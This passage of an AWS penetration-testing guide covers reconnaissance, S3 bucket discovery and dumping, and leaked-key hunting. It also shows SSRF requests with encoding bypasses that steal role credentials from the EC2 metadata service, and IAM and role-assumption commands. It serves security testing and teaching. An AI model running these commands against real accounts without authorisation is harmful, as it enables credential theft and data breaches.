---
title: AWS Enumeration
description:  AWS Enumeration — Reconnaissance, IAM, S3, EC2, Lambda, RDS, VPC, Privilege Escalation, Post-Exploitation, Persistence, Defense Evasion, and Methodology for Cloud Penetration Testing.
navigation:
  icon: i-lucide-cloud
---

## Overview

::callout
---
icon: i-lucide-info
color: info
---
**Amazon Web Services (AWS)** is the world's largest cloud platform with **200+ services** spanning compute, storage, databases, networking, AI/ML, security, and more. AWS environments are now the **primary target** in modern penetration testing — misconfigurations, excessive permissions, exposed credentials, and insecure defaults create massive attack surfaces. Unlike traditional infrastructure, a single IAM key can compromise an **entire organization's cloud environment** in minutes.
::

| Property | Detail |
| -------------- | -------------------------------------------------- |
| `Platform` | `Amazon Web Services (AWS)` |
| `Global Reach` | `33 Regions, 105 Availability Zones` |
| `Key Services` | `IAM, S3, EC2, Lambda, RDS, VPC, ECS, EKS, CloudTrail` |
| `Auth Methods` | `IAM Users, Roles, Federation, SSO, STS Tokens` |
| `API Endpoint` | `https://<service>.<region>.amazonaws.com` |
| `CLI Tool` | `aws` (AWS CLI v2) |
| `Risk Level` | `🔴 Critical — Single key can compromise everything` |
| `Common Findings` | `Exposed keys, public S3 buckets, overprivileged roles, SSRF to metadata` |

### AWS Global Architecture

```text [AWS Architecture Overview]
┌─────────────────────────────────────────────────────────────────┐
│                        AWS ACCOUNT                                │
├─────────────────────────────────────────────────────────────────┤
│                                                                   │
│  ┌─────────────────────────────────────────────────────────┐      │
│  │                    IAM (Global)                          │      │
│  │  Users → Groups → Policies → Roles → Federation        │      │
│  │  Access Keys → Session Tokens → MFA → SSO               │      │
│  └─────────────────────────────────────────────────────────┘      │
│                                                                   │
│  ┌──────────────────────────────────────────────────────┐         │
│  │              REGION (e.g., us-east-1)                 │         │
│  │                                                       │         │
│  │  ┌──────────────┐  ┌──────────────┐  ┌────────────┐  │         │
│  │  │  VPC         │  │  S3 Buckets  │  │  Lambda    │  │         │
│  │  │  ├── Subnets │  │  (Global     │  │  Functions │  │         │
│  │  │  ├── SG      │  │   namespace) │  │            │  │         │
│  │  │  ├── NACLs   │  └──────────────┘  └────────────┘  │         │
│  │  │  ├── IGW     │                                     │         │
│  │  │  └── NAT     │  ┌──────────────┐  ┌────────────┐  │         │
│  │  └──────────────┘  │  RDS / DynamoDB│  │  ECS/EKS  │  │         │
│  │                     │  Databases   │  │  Containers│  │         │
│  │  ┌──────────────┐  └──────────────┘  └────────────┘  │         │
│  │  │  EC2         │                                     │         │
│  │  │  Instances   │  ┌──────────────┐  ┌────────────┐  │         │
│  │  │  (Compute)   │  │  SQS/SNS     │  │  Secrets   │  │         │
│  │  └──────────────┘  │  Messaging   │  │  Manager   │  │         │
│  │                     └──────────────┘  └────────────┘  │         │
│  └──────────────────────────────────────────────────────┘         │
│                                                                   │
│  ┌─────────────────────────────────────────────────────────┐      │
│  │              CloudTrail / CloudWatch / GuardDuty         │      │
│  │              (Logging, Monitoring, Threat Detection)      │      │
│  └─────────────────────────────────────────────────────────┘      │
│                                                                   │
└─────────────────────────────────────────────────────────────────┘
```

### AWS Authentication — How It Works

::accordion

  :::accordion-item
  ---
  icon: i-lucide-key
  label: "IAM Credential Types"
  ---

  | Credential Type | Format | Lifetime | Usage |
  | --------------- | ------ | -------- | ----- |
  | `Access Key ID + Secret Key` | `AKIA...` + 40-char secret | Permanent (until rotated) | CLI, SDK, API |
  | `Session Token (STS)` | `ASIA...` + secret + token | Temporary (15min—36hr) | Assumed roles, federation |
  | `Console Password` | Username + password | Permanent | Web console login |
  | `MFA Token` | 6-digit TOTP code | 30 seconds | 2FA for console/CLI |
  | `EC2 Instance Role` | Auto-rotated via metadata | Temporary | EC2 → AWS API |
  | `Lambda Execution Role` | Environment variables | Per-invocation | Lambda → AWS API |
  | `SSO Token` | OIDC/SAML | Session-based | Federated login |

  **Access Key Prefixes:**

  | Prefix | Type | Meaning |
  | ------ | ---- | ------- |
  | `AKIA` | Permanent | Long-term IAM user access key |
  | `ASIA` | Temporary | STS temporary session credentials |
  | `AIDA` | IAM User | IAM user unique ID |
  | `AROA` | IAM Role | IAM role unique ID |
  | `ANPA` | Managed Policy | AWS managed policy |
  | `ANVA` | Version in Policy | Managed policy version |
  | `AIPA` | Instance Profile | EC2 instance profile |
  | `AGPA` | Group | IAM group ID |
  | `APKA` | Public Key | SSH public key |

  :::

  :::accordion-item
  ---
  icon: i-lucide-shield
  label: "AWS API Request Signing (SigV4)"
  ---

  Every AWS API call is authenticated using **Signature Version 4**:

  ```text [SigV4 Signing Process]
  1. Create Canonical Request
     - HTTP Method + URI + Query String + Headers + Signed Headers + Payload Hash
  
  2. Create String to Sign
     - Algorithm + Date + Credential Scope + Hash(Canonical Request)
  
  3. Calculate Signature
     - HMAC-SHA256 chain: DateKey → RegionKey → ServiceKey → SigningKey → Signature
  
  4. Add Signature to Request
     - Authorization header or query string parameters
  ```

  **Key Point:** If you have the **Access Key ID** and **Secret Access Key**, you can sign any API request and impersonate that identity.

  :::

  :::accordion-item
  ---
  icon: i-lucide-layers
  label: "AWS Account Structure"
  ---

  ```text [Account Hierarchy]
  AWS Organization (Management Account)
  ├── OU: Production
  │   ├── Account: prod-app (111111111111)
  │   ├── Account: prod-data (222222222222)
  │   └── Account: prod-infra (333333333333)
  ├── OU: Development
  │   ├── Account: dev-app (444444444444)
  │   └── Account: dev-test (555555555555)
  ├── OU: Security
  │   ├── Account: security-logging (666666666666)
  │   └── Account: security-audit (777777777777)
  └── OU: Sandbox
      └── Account: sandbox (888888888888)
  ```

  | Concept | Description |
  | ------- | ----------- |
  | `Account ID` | 12-digit number (e.g., `123456789012`) |
  | `Account Alias` | Friendly name for console login URL |
  | `Organization` | Multiple accounts managed centrally |
  | `OU (Organizational Unit)` | Grouping of accounts for policy inheritance |
  | `SCP (Service Control Policy)` | Org-level policy limiting what accounts can do |
  | `Root User` | God-mode account — email + password (no API keys!) |

  :::

::

---

## Initial Reconnaissance — External (No Credentials)

::tip
External reconnaissance **requires no AWS credentials**. You can discover a massive amount of information about a target's AWS infrastructure from the outside.
::

::steps{level="3"}

### Domain & DNS Reconnaissance

```bash [Terminal]
# ============================================
# IDENTIFY AWS USAGE
# ============================================

# Check if domain uses AWS
dig <TARGET_DOMAIN> ANY
dig <TARGET_DOMAIN> CNAME
dig <TARGET_DOMAIN> A
host <TARGET_DOMAIN>
nslookup <TARGET_DOMAIN>

# Check for AWS-specific DNS records
dig <TARGET_DOMAIN> TXT | grep -i "aws\|amazon\|ses\|spf"
# v=spf1 include:amazonses.com → Uses AWS SES for email

# Check CNAME records pointing to AWS
dig CNAME <TARGET_DOMAIN>
# app.target.com → d12345.cloudfront.net     → CloudFront
# api.target.com → abc123.execute-api.us-east-1.amazonaws.com → API Gateway
# www.target.com → s3-website-us-east-1.amazonaws.com → S3 Website
# mail.target.com → inbound-smtp.us-east-1.amazonaws.com → AWS SES

# ============================================
# AWS SERVICE IDENTIFICATION FROM DNS
# ============================================

# CloudFront distribution
dig <TARGET_DOMAIN> | grep cloudfront.net

# Elastic Load Balancer
dig <TARGET_DOMAIN> | grep elb.amazonaws.com
# Format: <name>-<id>.<region>.elb.amazonaws.com

# API Gateway
dig <TARGET_DOMAIN> | grep execute-api
# Format: <id>.execute-api.<region>.amazonaws.com

# S3 Website
dig <TARGET_DOMAIN> | grep s3
# Format: <bucket>.s3.amazonaws.com or s3-website-<region>.amazonaws.com

# Elastic Beanstalk
dig <TARGET_DOMAIN> | grep elasticbeanstalk.com

# EC2 instance
dig <TARGET_DOMAIN> | grep compute.amazonaws.com
# Format: ec2-<ip>.compute-1.amazonaws.com

# RDS
dig <TARGET_DOMAIN> | grep rds.amazonaws.com

# ============================================
# REVERSE DNS ON AWS IP RANGES
# ============================================

# AWS IP ranges (official)
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq '.prefixes[] | select(.service=="EC2") | .ip_prefix' | head -20

# Check if IP belongs to AWS
curl -s https://ip-ranges.amazonaws.com/ip-ranges.json | jq --arg ip "<TARGET_IP>" '.prefixes[] | select(.ip_prefix | test($ip))'

# Reverse DNS on suspected AWS IPs
dig -x <TARGET_IP>
# ec2-54-XX-XX-XX.compute-1.amazonaws.com → EC2 in us-east-1
```

**AWS DNS Patterns — Quick Reference:**

| Pattern | Service | Information Leaked |
| ------- | ------- | ------------------ |
| `*.cloudfront.net` | CloudFront CDN | Distribution ID |
| `*.elb.amazonaws.com` | Elastic Load Balancer | Region, ELB name |
| `*.execute-api.*.amazonaws.com` | API Gateway | Region, API ID |
| `*.s3.amazonaws.com` | S3 Bucket | Bucket name |
| `*.s3-website-*.amazonaws.com` | S3 Static Website | Bucket name, region |
| `*.elasticbeanstalk.com` | Elastic Beanstalk | Environment name |
| `ec2-*.compute*.amazonaws.com` | EC2 Instance | IP address, region |
| `*.rds.amazonaws.com` | RDS Database | Instance name, region |
| `*.cache.amazonaws.com` | ElastiCache | Cluster name, region |
| `*.es.amazonaws.com` | Elasticsearch/OpenSearch | Domain name, region |
| `*.redshift.amazonaws.com` | Redshift | Cluster name, region |

### S3 Bucket Discovery

::caution
**S3 buckets have a global namespace.** Guessing or discovering bucket names is one of the most common and impactful AWS enumeration techniques.
::

::tabs
  :::tabs-item{icon="i-lucide-code" label="Manual Discovery"}
  ```bash [Terminal]
  # ============================================
  # S3 BUCKET NAMING PATTERNS
  # ============================================
  
  # Common bucket name patterns to try:
  # <company>
  # <company>-dev / <company>-prod / <company>-staging
  # <company>-backup / <company>-backups
  # <company>-assets / <company>-media / <company>-static
  # <company>-data / <company>-db / <company>-database
  # <company>-logs / <company>-logging
  # <company>-uploads / <company>-files
  # <company>-config / <company>-configuration
  # <company>-internal / <company>-private
  # <company>-public / <company>-web / <company>-website
  # <company>-archive / <company>-old
  # <company>-terraform / <company>-cloudformation
  # <company>.<tld> / www.<company>.<tld>
  
  # ============================================
  # CHECK IF BUCKET EXISTS
  # ============================================
  
  # Method 1: HTTP HEAD request
  curl -s -I https://<BUCKET_NAME>.s3.amazonaws.com/
  # 200 = Exists + Public listing
  # 403 = Exists but no access (still useful!)
  # 404 = Doesn't exist
  
  # Method 2: AWS CLI (no credentials needed for public buckets)
  aws s3 ls s3://<BUCKET_NAME> --no-sign-request
  
  # Method 3: Direct URL
  curl -s https://<BUCKET_NAME>.s3.amazonaws.com/ | xmllint --format -
  curl -s https://s3.amazonaws.com/<BUCKET_NAME>/ | xmllint --format -
  
  # Method 4: Region-specific URL
  curl -s https://<BUCKET_NAME>.s3.us-east-1.amazonaws.com/
  curl -s https://<BUCKET_NAME>.s3.us-west-2.amazonaws.com/
  
  # ============================================
  # LIST BUCKET CONTENTS (If publicly listable)
  # ============================================
  aws s3 ls s3://<BUCKET_NAME> --no-sign-request --recursive
  
  # Download all contents
  aws s3 sync s3://<BUCKET_NAME> ./bucket_dump/ --no-sign-request
  
  # Check specific files
  aws s3 cp s3://<BUCKET_NAME>/secret.txt ./secret.txt --no-sign-request
  curl -s https://<BUCKET_NAME>.s3.amazonaws.com/secret.txt
  ```
  :::

  :::tabs-item{icon="i-lucide-code" label="Automated Tools"}
  ```bash [Terminal]
  # ============================================
  # S3SCANNER
  # ============================================
  pip3 install s3scanner
  
  # Scan from wordlist
  s3scanner scan --buckets-file bucket_names.txt
  
  # Dump public contents
  s3scanner dump --bucket <BUCKET_NAME>
  
  # ============================================
  # BUCKET FINDER
  # ============================================
  git clone https://github.com/gwen001/s3-buckets-finder.git
  python3 s3-buckets-finder.py -w wordlist.txt -t <TARGET_DOMAIN>
  
  # ============================================
  # CLOUD_ENUM
  # ============================================
  git clone https://github.com/initstring/cloud_enum.git
  cd cloud_enum
  python3 cloud_enum.py -k <TARGET_KEYWORD> -t 20
  # Checks: S3, Azure Blobs, GCP buckets
  
  # ============================================
  # SLURP
  # ============================================
  go install github.com/0xbharath/slurp@latest
  slurp domain -t <TARGET_DOMAIN>
  slurp keyword -t <TARGET_KEYWORD>
  
  # ============================================
  # LAZYS3
  # ============================================
  git clone https://github.com/nahamsec/lazys3.git
  ruby lazys3.rb <TARGET_COMPANY>
  
  # ============================================
  # FLAWS.CLOUD METHODOLOGY
  # ============================================
  
  # Generate bucket names from company info
  cat << 'EOF' > generate_buckets.sh
  #!/bin/bash
  COMPANY=$1
  SUFFIXES="dev prod staging test backup backups data db logs assets media static uploads files config internal private public web www archive old terraform cf infra"
  
  for suffix in $SUFFIXES; do
    echo "${COMPANY}-${suffix}"
    echo "${COMPANY}.${suffix}"
    echo "${COMPANY}${suffix}"
    echo "${suffix}-${COMPANY}"
    echo "${suffix}.${COMPANY}"
  done
  EOF
  chmod +x generate_buckets.sh
  ./generate_buckets.sh targetcorp > bucket_wordlist.txt
  ```
  :::
::

### Credential Discovery (OSINT)

::warning
**Exposed AWS credentials** are the #1 way cloud environments are compromised. Credentials are frequently leaked in source code, config files, and documentation.
::

```bash [Terminal]
# ============================================
# GITHUB SEARCH — EXPOSED CREDENTIALS
# ============================================

# GitHub dork searches
# Search: "AKIA" <company_name>
# Search: "aws_access_key_id" <company_name>
# Search: "aws_secret_access_key" <company_name>
# Search: ".s3.amazonaws.com" <company_name>
# Search: "amazonaws.com" password
# Search: filename:.env AWS_ACCESS_KEY
# Search: filename:.bash_history aws
# Search: filename:credentials aws_access_key_id
# Search: filename:config aws_access_key_id
# Search: filename:docker-compose.yml AWS
# Search: filename:terraform.tfvars aws

# ============================================
# TRUFFLEHOG — SECRET SCANNER
# ============================================
pip3 install trufflehog

# Scan GitHub organization
trufflehog github --org=<TARGET_ORG>
trufflehog github --repo=https://github.com/<TARGET_ORG>/<REPO>

# Scan git history
trufflehog git file://./repo --only-verified

# ============================================
# GITLEAKS
# ============================================
go install github.com/gitleaks/gitleaks/v8@latest

# Scan repo
gitleaks detect -s /path/to/repo -v
gitleaks detect --source https://github.com/<ORG>/<REPO> -v

# ============================================
# GIT-SECRETS
# ============================================
git clone https://github.com/awslabs/git-secrets.git
git secrets --scan

# ============================================
# GREP FOR AWS KEYS IN FILES
# ============================================

# Search for AWS access keys
grep -rEo 'AKIA[0-9A-Z]{16}' /path/to/search/
grep -rEo 'ASIA[0-9A-Z]{16}' /path/to/search/

# Search for secret keys (40 char base64-ish)
grep -rEo '[A-Za-z0-9/+=]{40}' /path/to/search/

# Search for AWS-related config
grep -rli 'aws_access_key\|aws_secret_key\|AWS_ACCESS_KEY\|AWS_SECRET_KEY\|aws_session_token' /path/to/search/

# Search in environment variables
env | grep -i aws
printenv | grep -i aws

# ============================================
# WEB APPLICATION SOURCES
# ============================================

# Check JavaScript files for embedded keys
curl -s https://<TARGET_DOMAIN>/main.js | grep -Eo 'AKIA[0-9A-Z]{16}'
curl -s https://<TARGET_DOMAIN>/main.js | grep -i 'aws\|amazon\|s3\|cognito'

# Wayback Machine — historical JavaScript
waybackurls <TARGET_DOMAIN> | grep "\.js$" | while read url; do
  curl -s "$url" | grep -Eo 'AKIA[0-9A-Z]{16}'
done

# Check for exposed .env files
curl -s https://<TARGET_DOMAIN>/.env
curl -s https://<TARGET_DOMAIN>/.env.backup
curl -s https://<TARGET_DOMAIN>/.env.production

# Check for exposed AWS config files
curl -s https://<TARGET_DOMAIN>/.aws/credentials
curl -s https://<TARGET_DOMAIN>/.aws/config
curl -s https://<TARGET_DOMAIN>/aws.yml

# ============================================
# PASTEBIN / CODE SHARING SITES
# ============================================

# Search Pastebin for leaked keys
# https://pastebin.com/search?q=AKIA+<company>
# https://grep.app/search?q=AKIA+<company>

# Google dorks
# "AKIA" site:pastebin.com "<company>"
# "aws_access_key" site:github.com "<company>"
# "s3.amazonaws.com" "<company>" filetype:pdf
```

### EC2 Instance Metadata Service (IMDS) — SSRF Target

::caution
**SSRF to the EC2 metadata service (169.254.169.254)** is one of the most devastating cloud attacks. If a web application running on EC2 is vulnerable to SSRF, you can steal IAM role credentials.
::

```bash [Terminal]
# ============================================
# IMDS v1 (No authentication — most dangerous)
# ============================================

# If you have SSRF vulnerability:
curl http://169.254.169.254/latest/meta-data/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/
curl http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# Response contains:
# {
#   "AccessKeyId": "ASIA...",
#   "SecretAccessKey": "...",
#   "Token": "...",
#   "Expiration": "2024-01-15T12:00:00Z"
# }

# Full metadata enumeration
METADATA_PATHS=(
  "ami-id"
  "ami-launch-index"
  "ami-manifest-path"
  "hostname"
  "instance-action"
  "instance-id"
  "instance-type"
  "local-hostname"
  "local-ipv4"
  "mac"
  "profile"
  "public-hostname"
  "public-ipv4"
  "public-keys/"
  "reservation-id"
  "security-groups"
  "iam/info"
  "iam/security-credentials/"
  "network/interfaces/macs/"
  "placement/availability-zone"
  "placement/region"
  "services/domain"
  "services/partition"
)

for path in "${METADATA_PATHS[@]}"; do
  echo "=== $path ==="
  curl -s http://169.254.169.254/latest/meta-data/$path
  echo ""
done

# ============================================
# USER DATA (May contain secrets!)
# ============================================
curl http://169.254.169.254/latest/user-data
# User data scripts often contain:
# - Database passwords
# - API keys
# - Bootstrap secrets
# - Configuration data

# ============================================
# IMDS v2 (Token-based — harder but not impossible)
# ============================================

# Step 1: Get token (requires PUT request with TTL header)
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" \
  -H "X-aws-ec2-metadata-token-ttl-seconds: 21600")

# Step 2: Use token in subsequent requests
curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/

curl -s -H "X-aws-ec2-metadata-token: $TOKEN" \
  http://169.254.169.254/latest/meta-data/iam/security-credentials/<ROLE_NAME>

# ============================================
# SSRF BYPASS TECHNIQUES FOR IMDS
# ============================================

# IPv6
http://[fd00:ec2::254]/latest/meta-data/

# DNS rebinding
# Register DNS that resolves to 169.254.169.254

# URL encoding
http://169.254.169.254/latest/meta-data/iam/security-credentials/
http://0xa9fea9fe/latest/meta-data/         # Hex
http://2852039166/latest/meta-data/         # Decimal
http://0251.0376.0251.0376/latest/meta-data/ # Octal
http://169.254.169.254.xip.io/latest/meta-data/  # DNS

# Redirect-based
# Host a redirect on your server pointing to 169.254.169.254

# Header injection for IMDSv2
# If you can inject headers, add X-aws-ec2-metadata-token-ttl-seconds
```

### AWS Account ID Discovery

::note
Discovering the **AWS Account ID** (12-digit number) is valuable for further enumeration and cross-account attacks.
::

```bash [Terminal]
# ============================================
# FROM S3 BUCKET POLICY
# ============================================
aws s3api get-bucket-policy --bucket <BUCKET_NAME> --no-sign-request 2>/dev/null
# Look for: "arn:aws:iam::123456789012:..."

# ============================================
# FROM ERROR MESSAGES
# ============================================

# S3 bucket errors sometimes leak account ID
curl -s https://<BUCKET_NAME>.s3.amazonaws.com/?policy

# STS error messages
aws sts get-access-key-info --access-key-id AKIA... 2>&1
# May reveal account ID

# ============================================
# FROM PUBLIC RESOURCES
# ============================================

# EC2 AMI sharing
aws ec2 describe-images --filters "Name=name,Values=*<COMPANY>*" --include-deprecated --region us-east-1 --no-sign-request

# EBS snapshot sharing
aws ec2 describe-snapshots --filters "Name=description,Values=*<COMPANY>*" --region us-east-1 --no-sign-request

# ============================================
# FROM ACCESS KEY (IF YOU HAVE ONE)
# ============================================
aws sts get-caller-identity
# {
#   "Account": "123456789012",   ← Account ID
#   "UserId": "AIDAXXXXXXXXX",
#   "Arn": "arn:aws:iam::123456789012:user/admin"
# }

# ============================================
# QUIET RECON — Account ID from Key
# ============================================
# This is the STEALTHIEST method — no CloudTrail logging!

# Using iam-key-to-account-id
python3 -c "
import boto3, json
client = boto3.client('sts',
    aws_access_key_id='AKIAXXXXXXXXXXXXXXXX',
    aws_secret_access_key='XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX'
)
print(json.dumps(client.get_caller_identity(), indent=2))
"
```

::

---

## Authenticated Enumeration — IAM

::caution
**IAM (Identity and Access Management)** is the foundation of AWS security. Enumerating IAM reveals users, groups, roles, policies, and permissions — essentially a **map of who can do what**.
::

### Configure AWS CLI

```bash [Terminal]
# ============================================
# SET UP AWS CREDENTIALS
# ============================================

# Method 1: AWS Configure (interactive)
aws configure
# AWS Access Key ID: AKIAXXXXXXXXXXXXXXXX
# AWS Secret Access Key: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
# Default region name: us-east-1
# Default output format: json

# Method 2: Environment variables
export AWS_ACCESS_KEY_ID="AKIAXXXXXXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
export AWS_DEFAULT_REGION="us-east-1"

# Method 3: For temporary credentials (STS)
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
export AWS_SESSION_TOKEN="FwoGZX..."
export AWS_DEFAULT_REGION="us-east-1"

# Method 4: Named profile
aws configure --profile stolen
# Then use: aws sts get-caller-identity --profile stolen

# Method 5: Credential file directly
cat >> ~/.aws/credentials << 'EOF'
[stolen]
aws_access_key_id = AKIAXXXXXXXXXXXXXXXX
aws_secret_access_key = XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX
EOF

# ============================================
# VERIFY CREDENTIALS
# ============================================
aws sts get-caller-identity
# {
#   "UserId": "AIDAXXXXXXXXXXXXXXXXX",
#   "Account": "123456789012",
#   "Arn": "arn:aws:iam::123456789012:user/compromised-user"
# }

# Check what region the creds work in
aws ec2 describe-regions --query 'Regions[].RegionName' --output text
```

### IAM User Enumeration

```bash [Terminal]
# ============================================
# CURRENT IDENTITY
# ============================================
aws sts get-caller-identity
aws iam get-user                                # Current user details
aws iam list-user-tags --user-name $(aws iam get-user --query 'User.UserName' --output text)

# ============================================
# LIST ALL IAM USERS
# ============================================
aws iam list-users
aws iam list-users --query 'Users[*].[UserName,Arn,CreateDate]' --output table

# User details
aws iam get-user --user-name <USERNAME>

# List access keys for each user
aws iam list-access-keys --user-name <USERNAME>

# Check when access key was last used
aws iam get-access-key-last-used --access-key-id AKIAXXXXXXXXXXXXXXXX

# List MFA devices
aws iam list-mfa-devices --user-name <USERNAME>
aws iam list-virtual-mfa-devices

# List signing certificates
aws iam list-signing-certificates --user-name <USERNAME>

# List SSH public keys
aws iam list-ssh-public-keys --user-name <USERNAME>

# List service-specific credentials (CodeCommit, etc.)
aws iam list-service-specific-credentials --user-name <USERNAME>

# ============================================
# LOGIN PROFILE (Console access)
# ============================================
aws iam get-login-profile --user-name <USERNAME>
# If this succeeds → user has console access
# If AccessDenied → no console access configured

# ============================================
# ENUMERATE ALL USERS — FULL DUMP
# ============================================
for user in $(aws iam list-users --query 'Users[*].UserName' --output text); do
  echo "===== USER: $user ====="
  aws iam get-user --user-name $user 2>/dev/null
  aws iam list-access-keys --user-name $user 2>/dev/null
  aws iam list-mfa-devices --user-name $user 2>/dev/null
  aws iam list-user-policies --user-name $user 2>/dev/null
  aws iam list-attached-user-policies --user-name $user 2>/dev/null
  aws iam list-groups-for-user --user-name $user 2>/dev/null
  echo ""
done
```

### IAM Group Enumeration

```bash [Terminal]
# List all groups
aws iam list-groups
aws iam list-groups --query 'Groups[*].[GroupName,Arn]' --output table

# List group members
aws iam get-group --group-name <GROUP_NAME>

# List group policies
aws iam list-group-policies --group-name <GROUP_NAME>           # Inline policies
aws iam list-attached-group-policies --group-name <GROUP_NAME>  # Managed policies

# Get inline policy document
aws iam get-group-policy --group-name <GROUP_NAME> --policy-name <POLICY_NAME>

# ============================================
# ENUMERATE ALL GROUPS
# ============================================
for group in $(aws iam list-groups --query 'Groups[*].GroupName' --output text); do
  echo "===== GROUP: $group ====="
  aws iam get-group --group-name $group --query 'Users[*].UserName' --output text
  aws iam list-attached-group-policies --group-name $group --query 'AttachedPolicies[*].PolicyName' --output text
  echo ""
done
```

### IAM Role Enumeration

::note
**IAM Roles** are often more privileged than users and can be assumed cross-account. They are the primary mechanism for service-to-service authentication.
::

```bash [Terminal]
# List all roles
aws iam list-roles
aws iam list-roles --query 'Roles[*].[RoleName,Arn]' --output table

# Get role details
aws iam get-role --role-name <ROLE_NAME>

# Get trust policy (WHO can assume this role)
aws iam get-role --role-name <ROLE_NAME> --query 'Role.AssumeRolePolicyDocument'

# List role policies
aws iam list-role-policies --role-name <ROLE_NAME>               # Inline
aws iam list-attached-role-policies --role-name <ROLE_NAME>      # Managed

# Get inline policy document
aws iam get-role-policy --role-name <ROLE_NAME> --policy-name <POLICY_NAME>

# List instance profiles (EC2 role assignments)
aws iam list-instance-profiles
aws iam list-instance-profiles-for-role --role-name <ROLE_NAME>

# ============================================
# ASSUME A ROLE (If trust policy allows)
# ============================================
aws sts assume-role --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME> --role-session-name hacked

# Use the temporary credentials
export AWS_ACCESS_KEY_ID="ASIAXXXXXXXXXXXXXXXX"
export AWS_SECRET_ACCESS_KEY="XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX"
export AWS_SESSION_TOKEN="FwoGZX..."

# Verify
aws sts get-caller-identity

# ============================================
# FIND OVERPRIVILEGED ROLES
# ============================================
for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do
  POLICIES=$(aws iam list-attached-role-policies --role-name $role --query 'AttachedPolicies[*].PolicyArn' --output text 2>/dev/null)
  if echo "$POLICIES" | grep -q "AdministratorAccess\|PowerUserAccess"; then
    echo "[!] OVERPRIVILEGED ROLE: $role → $POLICIES"
  fi
done
```

### IAM Policy Enumeration

```bash [Terminal]
# ============================================
# LIST POLICIES
# ============================================

# List all customer-managed policies
aws iam list-policies --scope Local
aws iam list-policies --scope Local --query 'Policies[*].[PolicyName,Arn]' --output table

# List AWS-managed policies attached to users/roles/groups
aws iam list-policies --only-attached --query 'Policies[*].[PolicyName,Arn,AttachmentCount]' --output table

# Get specific policy
aws iam get-policy --policy-arn <POLICY_ARN>

# Get policy version (actual permissions document)
aws iam get-policy-version --policy-arn <POLICY_ARN> --version-id v1

# List all versions of a policy
aws iam list-policy-versions --policy-arn <POLICY_ARN>

# ============================================
# GET ALL PERMISSIONS FOR CURRENT USER
# ============================================

# Inline policies
aws iam list-user-policies --user-name <USERNAME>
aws iam get-user-policy --user-name <USERNAME> --policy-name <POLICY_NAME>

# Managed policies
aws iam list-attached-user-policies --user-name <USERNAME>

# Group memberships and their policies
for group in $(aws iam list-groups-for-user --user-name <USERNAME> --query 'Groups[*].GroupName' --output text); do
  echo "Group: $group"
  aws iam list-attached-group-policies --group-name $group
  aws iam list-group-policies --group-name $group
done

# ============================================
# DANGEROUS POLICY PATTERNS TO LOOK FOR
# ============================================

# "Effect": "Allow", "Action": "*", "Resource": "*"
# → Full admin access (God mode)

# "Effect": "Allow", "Action": "iam:*"
# → Can modify any IAM resource → privilege escalation

# "Effect": "Allow", "Action": "sts:AssumeRole", "Resource": "*"
# → Can assume any role → privilege escalation

# "Effect": "Allow", "Action": "lambda:*"
# → Can create/modify Lambda functions with any role

# "Effect": "Allow", "Action": "s3:*", "Resource": "*"
# → Full S3 access to all buckets
```

### Password Policy Enumeration

```bash [Terminal]
# Get account password policy
aws iam get-account-password-policy

# Expected output:
# {
#   "PasswordPolicy": {
#     "MinimumPasswordLength": 8,     ← Should be 14+
#     "RequireSymbols": true,
#     "RequireNumbers": true,
#     "RequireUppercaseCharacters": true,
#     "RequireLowercaseCharacters": true,
#     "AllowUsersToChangePassword": true,
#     "ExpirePasswords": false,        ← Should be true
#     "MaxPasswordAge": 0,             ← Should be 90 or less
#     "PasswordReusePrevention": 0,    ← Should be 24
#     "HardExpiry": false
#   }
# }

# Get account summary (overall IAM statistics)
aws iam get-account-summary
# Shows: Users, Groups, Roles, Policies, MFA devices, Access keys, etc.

# Get credential report (all users' credential status)
aws iam generate-credential-report
sleep 5
aws iam get-credential-report --output text --query 'Content' | base64 -d > credential_report.csv
cat credential_report.csv
# Contains: User, MFA status, access key age, last login, password last changed, etc.
```

---

## S3 Bucket Enumeration

::warning
**S3 misconfigurations** are the most common and impactful AWS finding. Public buckets, overly permissive ACLs, and sensitive data exposure can lead to massive data breaches.
::

```bash [Terminal]
# ============================================
# LIST ALL BUCKETS
# ============================================
aws s3 ls
aws s3api list-buckets --query 'Buckets[*].[Name,CreationDate]' --output table

# ============================================
# BUCKET DETAILS
# ============================================
BUCKET="<BUCKET_NAME>"

# List contents
aws s3 ls s3://$BUCKET --recursive
aws s3 ls s3://$BUCKET --recursive --human-readable --summarize

# Get bucket location (region)
aws s3api get-bucket-location --bucket $BUCKET

# Get bucket ACL
aws s3api get-bucket-acl --bucket $BUCKET

# Get bucket policy
aws s3api get-bucket-policy --bucket $BUCKET --output text | jq .

# Check public access settings
aws s3api get-public-access-block --bucket $BUCKET

# Check bucket encryption
aws s3api get-bucket-encryption --bucket $BUCKET

# Check versioning
aws s3api get-bucket-versioning --bucket $BUCKET

# Check logging
aws s3api get-bucket-logging --bucket $BUCKET

# Check website configuration
aws s3api get-bucket-website --bucket $BUCKET

# Check CORS
aws s3api get-bucket-cors --bucket $BUCKET

# Check lifecycle rules
aws s3api get-bucket-lifecycle-configuration --bucket $BUCKET

# Check replication
aws s3api get-bucket-replication --bucket $BUCKET

# ============================================
# FIND PUBLIC / MISCONFIGURED BUCKETS
# ============================================

for bucket in $(aws s3api list-buckets --query 'Buckets[*].Name' --output text); do
  echo "=== $bucket ==="
  
  # Check ACL for public access
  ACL=$(aws s3api get-bucket-acl --bucket $bucket 2>/dev/null)
  if echo "$ACL" | grep -q "AllUsers\|AuthenticatedUsers"; then
    echo "[!] PUBLIC ACL DETECTED!"
